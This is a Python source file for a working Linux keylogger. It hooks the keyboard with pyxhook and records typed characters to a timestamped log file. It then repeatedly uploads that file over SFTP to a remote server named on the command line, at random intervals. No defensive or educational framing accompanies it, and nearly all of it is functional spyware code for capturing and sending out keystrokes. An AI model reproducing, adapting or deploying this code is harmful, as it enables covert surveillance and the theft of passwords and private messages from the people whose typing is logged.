import os
import argparse
import time
import random
from datetime import datetime
from pathlib import Path

import pyxhook
import pysftp


def parse_args() -> argparse.Namespace:
    parser = argparse.ArgumentParser()
    
    parser.add_argument('-prot', '--protocol', required=True, type=str, default='sftp', help='Protocol to send logged data.')
    parser.add_argument('-host', '--hostname', required=True, type=str, help='Name of hostname')
    parser.add_argument('-u','--username', required=True, type=str)
    parser.add_argument('-pass', '--password', required=True,type=str)
    parser.add_argument('-d', '--destination_path', required=True,type=str)
    return parser.parse_args()

def run_keylogger(args: argparse.Namespace):
    
    # set name for output file
    event_date = datetime.now()
    log_file = f'data/{event_date.date()}_{str(event_date.time()).split(sep=".")[0]}.log'
    
    #create file
    Path(log_file).touch()

    def on_key_press(event):
        with open(log_file, "a") as f:  # Open a file as f with Append (a) mode
            if event.Key == 'P_Enter' :
                f.write('\n')
            else:
                if 31 < int(event.Ascii) < 127:
                    f.write(f"{chr(event.Ascii)}")  # Write to the file and convert ascii to readable characters

    new_hook = pyxhook.HookManager()
    new_hook.KeyDown = on_key_press
    new_hook.HookKeyboard()  # set the hook

    try:
        new_hook.start()  # start the hook
    except KeyboardInterrupt:
        new_hook.cancel()
        pass
    except Exception as ex:
        # Write exceptions to the log file, for analysis later.
        msg = f"Error while catching events:\n  {ex}"
        pyxhook.print_err(msg)
        with open(log_file, "a") as f:
            f.write(f"\n{msg}")
    
    while True:
        if args.protocol == 'sftp':
            with pysftp.Connection(args.hostname, username=args.username, password=args.password) as sftp:
                with sftp.cd(args.destination_path):
                    sftp.put(log_file)  
        
        time.sleep(random.randint(a=1, b=10)) 

    sftp.close()


if __name__ == "__main__":
    args = parse_args()
    run_keylogger(args=args)
